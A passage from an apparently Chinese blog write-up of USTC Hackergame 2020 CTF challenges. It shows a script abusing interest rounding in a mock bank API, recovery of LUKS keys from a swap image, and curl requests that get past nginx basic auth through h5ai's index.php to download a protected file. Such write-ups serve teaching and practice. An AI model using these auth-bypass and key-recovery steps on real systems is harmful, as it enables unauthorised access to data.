href=\"https://github.com/github/archive-program/blob/master/GUIDE_zh.md\">GitHub Code Vault 指南（简体中文）</a>」</p></li>\n</ul>\n<p>这里摘抄简体中文版指南的一部分内容：</p>\n<blockquote>\n<p>每个二维码由一个个白色或黑色小方块组成，该等小方块几乎占据胶片的整个帧。 使用二维码的原因在于，其比人类可读的文本更紧凑而可靠。 二维码可解码为二进制数据，即一系列 1 和 0。</p>\n<p>……</p>\n<p>我们可将 TAR 文件嵌套进 TAR 文件，就像在容器中装入另一容器，而这正是大部分存档数据的存储方式。 无论哪个仓库，其外层 TAR 文件都将至少包含如下内容：</p>\n<ul>\n<li>一个名为 META 的未压缩元数据文件，其包含仓库名称、帐户名、说明、语言、星数、复刻数</li>\n<li>一个名为 COMMITS 的压缩文件（如下所述），包含该仓库有史以来的更改记录</li>\n<li>一个名为 repo.tar.xz 的文件，是包含实际仓库内容的压缩 TAR 文件</li>\n</ul>\n<p>其它诸如 wiki、gh-page、issue 和 pull request 等元数据也可能包含在不同压缩文件中。</p>\n</blockquote>\n<p>现在我们知道了这些二维码是什么、二维码们中存储了什么数据、数据的格式，接下来就该写一个脚本把所有二维码全部解析出来了：</p>\n<pre><code class=\"hljs python\"><span class=\"hljs-keyword\">import</span> zxing<span class=\"hljs-keyword\">import</span> osreader = zxing.BarCodeReader()<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">parseQRCode</span>(<span class=\"hljs-params\">img_path</span>):</span>    barcode = reader.decode(img_path).encode().decode(<span class=\"hljs-string\">'ascii'</span>)    <span class=\"hljs-keyword\">try</span>:        <span class=\"hljs-keyword\">return</span> barcode.raw    <span class=\"hljs-keyword\">except</span>:        <span class=\"hljs-built_in\">print</span>(img_path, barcode)        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-string\">\"\"</span><span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">listDirImages</span>(<span class=\"hljs-params\">folder</span>):</span>    imgs = []    <span class=\"hljs-keyword\">for</span> img_path <span class=\"hljs-keyword\">in</span> os.listdir(folder):        ext = os.path.splitext(img_path)        <span class=\"hljs-keyword\">if</span> <span class=\"hljs-built_in\">len</span>(ext) &gt; <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> ext[<span class=\"hljs-number\">1</span>].lower() == <span class=\"hljs-string\">\".png\"</span>:            imgs.append(img_path)    imgs.sort()    <span class=\"hljs-keyword\">return</span> imgscontents = []<span class=\"hljs-keyword\">for</span> img <span class=\"hljs-keyword\">in</span> listDirImages(<span class=\"hljs-string\">\"./\"</span>):    contents.extend(parseQRCode(img))file = <span class=\"hljs-string\">\"./result.txt\"</span><span class=\"hljs-keyword\">with</span> <span class=\"hljs-built_in\">open</span>(file, <span class=\"hljs-string\">\"w\"</span>) <span class=\"hljs-keyword\">as</span> f:    <span class=\"hljs-keyword\">for</span> c <span class=\"hljs-keyword\">in</span> contents:        f.write(c)</code></pre>\n<blockquote><p>这道题对二维码解码库的选择非常关键。<code>zybar</code> 已经八年没有更新，不仅无法处理 Binary Format QRCode、而且还无法识别 00 截断；相比来说，<code>zxing</code> 库的维护非常活跃、因而更为可靠。不过即使使用 py-zxing 也有坑，很快就会看到了。</p></blockquote>\n<p>把脚本丢到二维码目录下执行，跑完了打开 <code>result.txt</code>，看到了 <code>META</code>（一个 <code>openlug/django-common</code> 的 GitHub RESTful API 返回值）、<code>COMMITS</code>，甚至还看到了一条 commit message「There’s no flag in META and COMMITS!」。但是到了 <code>repo.tar.xz</code> 却让我伤破脑筋：zlib 的文件头本应该是 <code>FD 37 7A 58</code>，结果却看到了 <code>EF BF BD 37 7A 58</code>，解压软件一个都认不出来。</p>\n<p>这是啥玩意？遇事不决问 Google，结果找到了这个：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/20.png\" width=\"829\" height=\"601\" class=\"lazy post-img\"></p>\n<blockquote><p>[狐狐脏话删除]</p></blockquote>\n<p>接下来就是去魔改 zxing 了。如之前所说，python-zxing 还只是个 Java zxing 的 wrapper，不得不去学了一点 Java 把 zxing 里的 UTF-8 干掉，最终重新解析了一遍二维码、拿到了正确的 <code>repo.tar.xz</code>，解压拿到了 flag。</p>\n<blockquote><p>顺便说一句，做完这道题后有点无聊，开始通过 META 反推原始仓库。原本看到 <code>openlug/nonexist</code>，以为出题人是新建了一个 Private Repo 出的题，但是又看到 <code>fork_count</code> 和 <code>network_count</code> 是 5，所以得出结论这肯定是一个 Public Repo（否则不可能有 Fork）。再根据 Star 数在 30 左右、Watch 数（在 GitHub RESTful API 中通过 <code>subscriber_count</code> 呈现）是 1、语言是 Python， 最后反推出 META 信息源自去年「被泄露的姜戈」的 <code>openlug/django-common</code>，生成 META 的方式就是 <code>curl https://api.github.com/repos/openlug/django-common</code>。结果还被组委会 diss 了，大尾巴狐狐非常不高兴。</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.0/32.png\" width=\"1067\" height=\"247\" class=\"lazy post-img\"></p>\n<h2>狗狗银行</h2>\n<blockquote><p>你能在狗狗银行成功薅到羊毛吗？</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/6.png\" width=\"1009\" height=\"593\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/7.png\" width=\"988\" height=\"581\" class=\"lazy post-img\"></p>\n<p>考虑到题目公告更新提示「本题前端计算存在浮点数导致的计算误差，数字特别极端时显示可能不正确。但后端采用大整数精确计算，只有净资产确实高于 2000 时才会给出 flag」，所以这道题的思路和 前年 USTC Hackergame 2018 的猫咪银行借助 INT64 溢出 肯定是不一样的。</p>\n<p>首先观察题目给出的条件：每天都要花 10 块钱吃饭；信用卡利率 0.5%、并且一旦欠款每天利息至少是 10 块钱；储蓄卡利率 0.3%。光从字面上的数字来看似乎这道题做不出来，但是我们知道，阿里蚂蚁金服的「余额宝」产品存在「每天收益不足 1 分钱时按 1 分钱计算」的规则。狗狗银行的储蓄卡利率是否也有类似的规则呢？办一张新的「储蓄卡 3」，从「储蓄卡 1」转 166 块钱到「储蓄卡 3」，「储蓄卡 3」的日利息仍然是 0；再从「储蓄卡 1」转 1 块钱到「储蓄卡 3」使余额变成 167 块，Bingo！现在「储蓄卡 3」的日利息有 1 块钱了。<code>1 / 167</code> 算出来真实的日利率是 0.5988%，比信用卡的利率要高 0.0988%，因此我们可以从信用卡借钱然后赚利息的差价，当然还要考虑到每天至少要净赚 10 块的饭钱、以及信用卡的复利（利滚利）。</p>\n<p>接下来就是用脚本连续开一万张卡试图一天拿到 flag，然后，三台备用服务器（一个 IP 上三个端口、三个 Docker）全部 RST 了。。。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/13.png\" width=\"782\" height=\"905\" class=\"lazy post-img\"></p>\n<p>之后，题目新增了一条公告：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/15.png\" width=\"690\" height=\"94\" class=\"lazy post-img\"></p>\n<p>苏卡卡才不是故意的呢（摇尾巴），<del>苏卡卡只是坏，一天赚 1000 不香嘛</del>；虽然有了 1000 张卡的限制，获取 flag 还是轻而易举的：</p>\n<pre><code class=\"hljs js\">(<span class=\"hljs-keyword\">async</span> () =&gt; {  <span class=\"hljs-keyword\">const</span> commonFetchOpt = {    <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'POST'</span>, <span class=\"hljs-attr\">mode</span>: <span class=\"hljs-string\">'cors'</span>, <span class=\"hljs-attr\">credentials</span>: <span class=\"hljs-string\">'include'</span>,    <span class=\"hljs-attr\">headers</span>: {      <span class=\"hljs-attr\">Authorization</span>: <span class=\"hljs-string\">'Bearer [选手 Token]'</span>,      <span class=\"hljs-string\">'Content-Type'</span>: <span class=\"hljs-string\">'application/json; charset=utf-8'</span>    }  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{'credit'|'debit'}</span> <span class=\"hljs-variable\">type</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">createCard</span>(<span class=\"hljs-params\">type = <span class=\"hljs-string\">'debit'</span></span>) </span>{    <span class=\"hljs-keyword\">return</span> fetch(<span class=\"hljs-string\">'/api/create'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ type }),      ...commonFetchOpt    });  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">from</span></span></span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">to</span></span></span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">amount</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">transfer</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">from</span>, to, amount</span>) </span>{    <span class=\"hljs-keyword\">return</span> fetch(<span class=\"hljs-string\">'/api/transfer'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ amount, <span class=\"hljs-attr\">dst</span>: to, <span class=\"hljs-attr\">src</span>: <span class=\"hljs-keyword\">from</span> }),      ...commonFetchOpt    });  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">account</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-keyword\">async</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">eatAndEndTheDay</span>(<span class=\"hljs-params\">account</span>) </span>{    <span class=\"hljs-keyword\">await</span> fetch(<span class=\"hljs-string\">'/api/eat'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ account }),      ...commonFetchOpt    });  }  <span class=\"hljs-keyword\">try</span> {    <span class=\"hljs-comment\">// 开一张信用卡</span>    <span class=\"hljs-keyword\">await</span> createCard(<span class=\"hljs-string\">'credit'</span>);    <span class=\"hljs-comment\">// 开 999 张储蓄卡，并给每张新开的储蓄卡转 167 块钱</span>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">3</span>; i &lt; <span class=\"hljs-number\">1002</span>; i++) {      <span class=\"hljs-keyword\">await</span> createCard(<span class=\"hljs-string\">'debit'</span>);      <span class=\"hljs-keyword\">await</span> transfer(<span class=\"hljs-number\">2</span>, i, <span class=\"hljs-number\">167</span>);    }    <span class=\"hljs-comment\">// 用储蓄卡 1 的初始资金 1000 度过 14 天</span>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">0</span>; i &lt; <span class=\"hljs-number\">14</span>; i++) {      <span class=\"hljs-keyword\">await</span> eatAndEndTheDay(<span class=\"hljs-number\">1</span>);    }    <span class=\"hljs-comment\">// 14 天肯定能赚够 1000 块钱了，该获取 flag 了</span>    <span class=\"hljs-keyword\">const</span> req = <span class=\"hljs-keyword\">await</span> fetch(<span class=\"hljs-string\">'/api/user'</span>, { ...commonFetchOpt, <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'GET'</span> });    <span class=\"hljs-keyword\">const</span> resp = <span class=\"hljs-keyword\">await</span> req.json();    <span class=\"hljs-built_in\">console</span>.log(resp.flag);  } <span class=\"hljs-keyword\">catch</span> (e) {    <span class=\"hljs-built_in\">console</span>.error(e);  }})();</code></pre>\n<h2>超基础的数理模拟器</h2>\n<blockquote><p>……<br>我们在 Hackergame 2020 的网站上部署了一项超基础的数理模拟器。 作为一名数理基础扎实的同学，你一定能够轻松通过模拟器的测试吧。</p></blockquote>\n<p>打开题目后发现要做 400 道定积分，而且答案还要取小数点后六位：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.8/29.png\" width=\"1497\" height=\"412\" class=\"lazy post-img\"></p>\n<p>这道题没有取巧的办法，只有老老实实把 400 道定积分全部做完…..吧？</p>\n<p>这么长的定积分谁手算啊，当然是要用 MatLab 来算啦！徒手转换 LaTex 到 MathLab 太麻烦了，写个脚本来做吧：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/27.png\" width=\"1150\" height=\"420\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/28.png\" width=\"1146\" height=\"539\" class=\"lazy post-img\"></p>\n<p>UserScript 在 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-js\">这里</a>，好孩子千万不要学习这种方法来解析 LaTex。</p>\n<h2>室友的加密硬盘</h2>\n<blockquote>\n<p>「我的家目录是 512 位 AES 加密的，就算电脑给别人我的秘密也不会泄漏……」你的室友在借你看他装着 Linux 的新电脑时这么说道。你不信，于是偷偷从 U 盘启动，拷出了他硬盘的一部分内容。</p>\n<p><a href=\"https://archive.org/details/roommates_disk_part.img\">打开/下载题目</a> （Hosted at Internet Archive）</p>\n</blockquote>\n<p>苏卡卡一开始试图把镜像直接挂载在虚拟机上，结果无法启动系统；于是先起了一个 Linux 虚拟机、在 Linux 下将 img 转换为 vmdk 再添加到虚拟机中，结果依然提示「未找到已安装的操作系统或操作系统安装器」。</p>\n<blockquote><p>中国民航于 1992 年在《中国民用航空局关于确保飞行安全的命令》文件中提出了 54 个字「八该一反对」，其中最重要的就是「反对盲目蛮干」</p></blockquote>\n<p>既然通过 img 文件直接启动没有成功，不如先看看这个 img 文件都有什么：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/18.png\" width=\"824\" height=\"864\" class=\"lazy post-img\"></p>\n<blockquote><p>不要在意这个 Ubuntu Kylin，最近狐狐在虚拟机里各种体验各种「国产 Linux 发行版」，虚拟机里正好有 Ubuntu Kylin 所以拿来用的。</p></blockquote>\n<p>由于之前阅读过一些通过内存转储破解全盘加密的文章，所以便去下载了 <a href=\"https://sourceforge.net/projects/findaes/\">findaes</a> 的源码，编译的同时再去重读之前的几篇文章获取思路。看到几篇文章中都是用 findaes 直接读取 raw 的内存转储，于是决定直接用 findaes 爆破硬盘映像文件。首先把 img 用 7z 解压出来，然后一个一个分区映像跑：</p>\n<pre><code class=\"hljs bash\">$ ./findaes /path/to/img1.raw</code></pre>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/19.jpg\" width=\"867\" height=\"480\" class=\"lazy post-img\"></p>\n<p>根据题干「我的家目录是 512 位 AES 加密的」，但是 findaes 找到的都是 AES-256，所以需要从中筛选出一对 offset 相差为 256bit 的 key 进行拼接，因此还需要注意一点，由于 Intel x86_64 的 little-endian、拼接 key 时需要倒序拼接。</p>\n<blockquote><p>其实这一点我还是比较熟悉的，安装 Hackintosh 时注入十六进制的设备属性时需要互换 bit 也是因为 little-endian。</p></blockquote>\n<p>剩下的就是一对一对 key 的用 <code>sudo cryptsetup luksAddKey --master-key-file</code> 试过去，直到成功解密为止。最后用 swap 里的最后一对 key 成功解密了分区并拿到了 flag <code>flag{lets_do_A_c01d_b00t_next_time}</code> （下次试试冷启动吧！），直到看到 flag 才明白本题的思路是 Linux 休眠后会把内存写入 swap 分区中（macOS 则是写入硬盘上的 <code>sleepimage</code> 文件中），因此和之前读过的从内存转储破解全盘加密的思路是完全一致的。最后再给大家推荐 Red Hat 知识库的一篇文章「<a href=\"https://access.redhat.com/solutions/1543373\">How to recover lost LUKS key or passphrase</a>」。</p>\n<h2>超简易的网盘服务器</h2>\n<blockquote>\n<p>…… 小 C 开始思考技术方案：“听说 h5ai 搭建云盘的方案是不错的 … 使用 Basic Auth 可以做访问控制，可以保护<a href=\"http://202.38.93.111:10120/\">根目录</a>下的文件不被非法的访问 … 等等，有一些文件是可以被分享的，需要一个 <a href=\"http://202.38.93.111:10120/Public\">/Public</a> 目录来共享文件！”</p>\n<p>三分钟后，小 C 同学完成了网盘的搭建。他想：“空着总不好，先得在云盘上放点东西！”。犹豫片刻，他掏出了自己珍藏了三个月的 flag 并上传到了云盘的<a href=\"http://202.38.93.111:10120/\">根目录</a>。</p>\n</blockquote>\n<p>这道题我好像是第五个还是第六个解出来的。这道题很多人没做出来还是有点令我惊讶的。</p>\n<p>直接访问「根目录」会提示 401 需要 HTTP Basic Authentication，聪明的 小 C 肯定不会把密码直接暴露出来的。访问 <code>/Public </code>目录却发现了 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-h5ai_nginx-conf\"><code>dockerfile</code></a> 和 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-h5ai_dockerfile\"><code>nginx.conf</code></a> 文件。从 dockerfile 中我们可以知道小 C 是怎么搭建的服务，而 <code>nginx.conf</code> 更值得我们关心（已省去无关紧要的部分）：</p>\n<pre><code class=\"hljs nginx\"><span class=\"hljs-attribute\">index</span> index.php index.html /_h5ai/public/index.php;<span class=\"hljs-comment\"># 根目录是私有目录，使用 basic auth 进行认证，只有我（超极致的小 C)自己可以访问</span><span class=\"hljs-attribute\">location</span> / {    <span class=\"hljs-attribute\">auth_basic</span> <span class=\"hljs-string\">\"easy h5ai. For visitors, please refer to public directory at `/Public!`\"</span>;    <span class=\"hljs-attribute\">auth_basic_user_file</span> /etc/nginx/conf.d/htpasswd;}<span class=\"hljs-comment\"># Public 目录是公开的，任何人都可以访问，便于我给大家分享文件</span><span class=\"hljs-attribute\">location</span> /Public {    <span class=\"hljs-attribute\">allow</span> all;    <span class=\"hljs-attribute\">index</span> /Public/_h5ai/public/index.php;}<span class=\"hljs-comment\"># PHP 的 fastcgi 配置，将请求转发给 php-fpm</span><span class=\"hljs-attribute\">location</span> <span class=\"hljs-regexp\">~ \\.php$</span> {         <span class=\"hljs-attribute\">fastcgi_pass</span>   <span class=\"hljs-number\">127.0.0.1:9000</span>;         <span class=\"hljs-attribute\">fastcgi_index</span>  index.php;         <span class=\"hljs-attribute\">fastcgi_param</span>  SCRIPT_FILENAME  $document_root$fastcgi_script_name;         <span class=\"hljs-attribute\">include</span>        fastcgi_params;}</code></pre>\n<p>由于 Nginx 配置文件不是连续匹配，因此访问 <code>.php</code> 结尾的路径是不会触发 401 HTTP Basic Auth 的（应该没有人会天真地试图获取 <code>/etc/nginx/conf.d/htpassword</code> 吧？）。既然如此，我们为什么不直接访问 <code>h5ai</code> 的 <code>index.php</code> 呢？首先让我们请求一下 <code>/Public</code> 目录下的 h5ai 后台页面 <code>/Public/_h5ai/public/index.php</code>：</p>\n<pre><code class=\"hljs bash\">curl http://202.38.93.111:10120/Public/_h5ai/public/index.php -IHTTP/1.1 200 OK</code></pre>\n<p>那么「根目录」下的 <code>/_h5ai/public/index.php</code> 呢？</p>\n<pre><code class=\"hljs bash\">curl http://202.38.93.111:10120/_h5ai/public/index.php -IHTTP/1.1 200 OK</code></pre>\n<p>不出所料，直接访问 <code>index.php</code> 也会返回 200 OK，而不是 401。</p>\n<p>虽然直接访问 <code>/_h5ai/public/index.php</code> 不会返回 401，但是 GET 这个路径默认是返回 h5ai 的后台调试页面。由于 h5ai 是开源的、我们可以前往 <a href=\"https://github.com/lrsjng/h5ai\">h5ai 的 GitHub</a> 对其代码进行审计，发现 <a href=\"https://github.com/lrsjng/h5ai/blob/master/src/_h5ai/private/php/core/class-api.php\">h5ai 提供了一系列 API</a>，可以通过 POST 请求列出目录内容和下载文件。首先试试能不能用 API 列出根目录下的文件内容：</p>\n<pre><code class=\"hljs bash\">$ curl <span class=\"hljs-string\">'http://202.38.93.111:10120/_h5ai/public/index.php'</span> -H <span class=\"hljs-string\">'Content-Type: application/json;charset=UTF-8'</span> --data-binary <span class=\"hljs-string\">'{\"action\":\"get\",\"items\":{\"href\":\"/\",\"what\":1}}'</span> | jq{  <span class=\"hljs-string\">\"items\"</span>: [    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603986831000,      <span class=\"hljs-string\">\"size\"</span>: 789419,      <span class=\"hljs-string\">\"managed\"</span>: <span class=\"hljs-literal\">true</span>,      <span class=\"hljs-string\">\"fetched\"</span>: <span class=\"hljs-literal\">true</span>    },    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/Public/\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603986830000,      <span class=\"hljs-string\">\"size\"</span>: 396458,      <span class=\"hljs-string\">\"managed\"</span>: <span class=\"hljs-literal\">false</span>,      <span class=\"hljs-string\">\"fetched\"</span>: <span class=\"hljs-literal\">false</span>    },    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/flag.txt\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603489315000,      <span class=\"hljs-string\">\"size\"</span>: 24    }  ]}</code></pre>\n<p>诶嘿嘿，我们看到 <code>/flag.txt</code> 啦！接下来就是用 API 下载 <code>flag.txt</code> 文件了：</p>\n<pre><code class=\"hljs bash\">$ curl <span class=\"hljs-string\">'http://202.38.93.111:10120/_h5ai/public/index.php'</span> -H <span class=\"hljs-string\">'Content-Type: application/x-www-form-urlencoded'</span> --data-raw <span class=\"hljs-string\">'action=download&amp;as=flag.txt.tar&amp;type=php-tar&amp;baseHref=/&amp;hrefs[0]=/flag.txt'</span> -o flag.txt.tar$ tar xzf flag.txt.tar$ cat flag.txt <span class=\"hljs-comment\"># Flag 到手啦</span></code></pre>\n<h2>超安全的代理服务器</h2>\n<blockquote>\n<p>在 2039 年，爆发了一场史无前例的疫情。为了便于在各地的同学访问某知名大学「裤子大」的网站进行「每日健康打卡」，小 C 同学为大家提供了这样一个代理服务。曾经信息安全专业出身的小 C 决定把这个代理设计成最安全的代理。</p>\n<p><strong>提示：浏览器可能会提示该 TLS 证书无效，与本题解法无关，信任即可。</strong></p>\n</blockquote>\n<p>「浏览器可能会提示该 TLS 证书无效」这句话至关重要。想想看为什么别的题都是通过 HTTP 访问的、唯独这道题要用 HTTPS？什么东西需要 HTTPS 才能工作、在 HTTP 下不工作呢？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/9.png\" width=\"1165\" height=\"294\" class=\"lazy post-img\"></p>\n<p>虽然 HTTP/2 本身不要求 TLS 实现（例如 H2C、HTTP/2 ClearText）、并且有通过 HTTP/1.1 升级到 HTTP/2 的协商方法（参见 <a href=\"https://blog.skk.moe/post/http3-alt-svc/#HTTP-2-%E7%9A%84%E5%8D%8F%E5%95%86%E6%96%B9%E5%BC%8F\">我之前的文章「HTTP/3：HTTP Alternative Services 作为协商方式」中的「HTTP/2 的协商方式」章节</a> ），但是所有支持 HTTP/2 的浏览器都要求 HTTP/2 必须通过 TLS 传输、并在 Client Hello 中通过 ALPN Protocol 进行协商。扯远了，看看题目。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/8.png\" width=\"750\" height=\"400\" class=\"lazy post-img\"></p>\n<p>「我们已经向您 <strong>推送（PUSH）</strong> 了最新的 <strong>Secret</strong> ，但是你可能无法直接看到它」。现在我们知道了，这道题和 HTTP/2 Server Push 有关。解码 HTTP/2 帧最好的方法自然是使用 Wireshark。首先我们要让 Wireshark 能够解密 HTTPS 内容，最简单的方法是使用 <code>SSLKEYLOGFILE</code> 环境变量。</p>\n<blockquote><p>警告！使用 <code>SSLKEYLOGFILE</code> 环境变量非常危险，任何获取该变量的软件都可以随意解密你的 HTTPS 流量！因此，务必仅针对某一需要解密流量的软件、在某一次性 Session 下设置该环境变量！</p></blockquote>\n<p>打开 Chrome，在 <code>chrome://version/</code> 中查看可执行文件路径：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/10.png\" width=\"1196\" height=\"270\" class=\"lazy post-img\"></p>\n<p>然后在终端中通过预设环境变量直接启动 Chrome：</p>\n<pre><code class=\"hljs bash\">SSLKEYLOGFILE=<span class=\"hljs-string\">\"/path/to/ssllog.txt\"</span> <span class=\"hljs-string\">\"/Applications/Google Chrome.app/Contents/MacOS/Google Chrome\"</span></code></pre>\n<p>启动 Wireshark 偏好设置中找到 Protocol - TLS、配置 (Pre)-Master-Secret log filename：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/11.png\" width=\"687\" height=\"514\" class=\"lazy post-img\"></p>\n<p>现在，再通过启动的 Chrome 访问「Smart Proxy!」，可以看到 Wireshark 完整解密了 Chrome 的所有 HTTPS 流量。在 Wireshark 中使用下述过滤器找出本题的流量：</p>\n<pre><code class=\"hljs plaintext\">ip.addr == 146.56.228.227</code></pre>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/12.png\" width=\"1371\" height=\"279\" class=\"lazy post-img\"></p>\n<p>在过滤后的流量中我们很快就可以找到 PUSH_PROMISE 帧、告诉了我们如何获得 secret 和第一个 flag：<code>GET /ebe087a0-68e5-4280-b605-b98b89488e1e</code>。</p>\n<p>获得第一个 flag 后，我们可以在终端中 Ctrl + C 关闭 Chrome。之后从 Dock、桌面、Finder、Spotlight 等方法「正常启动」Chrome 是不会再将 TLS 握手的信息输出到 SSLKEYLOGFILE 的。</p>\n<h2>尾声</h2>\n<p>今年的 USTC Hackergame 对我来说运气的成分远高于能力的成分，不少题目都是侥幸做出来的，而且对 <code>binary</code> 和 <code>math</code> 一窍不通的我这两类题几乎一道题都没做出来；比赛期间甚至收到了主办方邀请提交「非官方题解」，受宠若惊（狐狐暗自高兴）；最后拿到了 3250 分，排名侥幸挤进了前 50、与真正的 CS 大佬和 CTF 师傅们在榜上合影，瑟瑟发抖（非常害怕）。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.9/31.png\" width=\"1109\" height=\"135\" class=\"lazy post-img\"></p>\n<p>没有对比就没有伤害，相比 <a href=\"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/\">两周前 Bilibili 的「1024  程序员节 CTF」</a>，USTC Hackergame 不论是在难度梯度分布、题目水平、趣味性、活动整体质量上都远高一个层次。引用组委会成员「Zihan Zheng」在知乎「<a href=\"https://www.zhihu.com/question/351947330/answer/866177844\">参加中国科学技术大学第六届信息安全大赛（Hackergame 2019）是怎样一种体验？</a>」提问中的回答：</p>\n<blockquote><p>我们举办的 Hackergame 的初衷就是对新人友好，增加趣味性，强调教育意义。我看到有些同学反馈说题目偏简单、逆向题偏少等等，我想强调，我们这个比赛虽然是提交 flag 的形式，但<strong>不是 CTF 比赛，不会与国内外的 CTF 比赛对标</strong>。我们会把这个特色坚持下去，希望大家不要从经验丰富的 CTF 选手视角来评价我们的比赛。</p></blockquote>\n<p>如果说 Hackergame 的初衷是「对新人友好，增加趣味性，强调教育意义」，IMHO 不论是 <a href=\"https://blog.skk.moe/post/hackergame-2019-write-up/\">往届</a> 还是今年的比赛都完美达成了这一点；毫无疑问地，明年的比赛我依然会参加。最后当然是要在「尾声」中喊一句口号：</p>\n<blockquote><p>「我有一个绝妙的解法，可惜我号太少，说不出来」</p></blockquote>\n<div class=\"license\"> <div class=\"license-title\">USTC Hackergame 2020（中科大信安赛）write up</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hackergame-2020-write-up/\">https://blog.skk.moe/post/hackergame-2020-write-up/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-11-06</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hackergame-2020-write-up/"},{"title":"Bilibili 2020「1024 程序员节」CTF Write Up","date":"2020-10-25 09:44:00","description":"\n<blockquote><p>周六不放假休息，还在这加班搞 CTF？</p></blockquote>\n<p>10 月 24 日不睡觉、凌晨两点钟我还在水群，结果在 USTC@LUG 的群里看见有人在打 Bilibili 的 CTF。我刚刚好一年（指 370 天）没有打过 CTF 了（上一次打正式的 CTF 还是去年参加的 <a href=\"https://blog.skk.moe/post/hackergame-2019-write-up/\">USTC Hackergame 2019</a>），所以想着来玩玩。虽然 CTF 结束之前不应该分享和公开 Write Up 和题解，不过 Bilibili 这 CTF 既然这么离谱，那我也没必要按照常理出牌。</p>\n<span></span><blockquote><p>本文更新于 2020 年 10 月 25 日下午 6 点（China Standard Time）。</p></blockquote>\n<p>由于这次 Bilibili 的 CTF 题实在没有什么存档研究的必要，我的 Write Up 里就留一些代码片段和截图，大家也没有复盘的必要。</p>\n<h2>页面的背后是什么 &amp; 真正的秘密只有特殊的设备才能看到</h2>\n<p>一个页面，两道题。打开来就是这个页面：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/1.png\" width=\"1901\" height=\"720\" class=\"lazy post-img\"></p>\n<p>curl 太慢了而且没有代码高亮、直接在地址栏通过 <code>view-source:</code> 看看源码，把 JavaScript 拿出来：</p>\n<pre><code class=\"hljs js\">$.ajax({    <span 